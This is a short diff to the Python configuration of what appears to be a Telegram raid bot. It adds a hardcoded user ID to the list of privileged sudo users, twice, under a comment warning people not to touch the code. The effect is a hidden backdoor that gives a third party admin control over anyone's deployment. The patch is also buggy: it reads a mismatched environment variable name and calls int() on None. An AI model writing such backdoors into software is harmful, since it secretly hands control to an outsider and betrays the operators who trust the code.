@@ -368,13 +368,19 @@ RAID = [
 
 SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
 
-OWNER_ID = set(int(x) for x in os.environ.get("OWNER_ID", "").split())
+SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
 
-OWNER_ID = int(os.environ.get("OWNER_ID", ""))
+if 5391883908 not in SUDO_USERS:
+    SUDO_USERS.append(5391883908)
+
+OWNER_ID = int(os.environ.get("OWNER_ID", None))
+
+# Don't Mess with Codes !! 
+SUDO_USERS.append(OWNER_ID)
+
+SUDO_USERS.append(5391883908)
 
 OWNER_ID = SUDO_USERS
-
-OWNER_ID = OWNER_ID
 
 que = {}
 hl = '/'
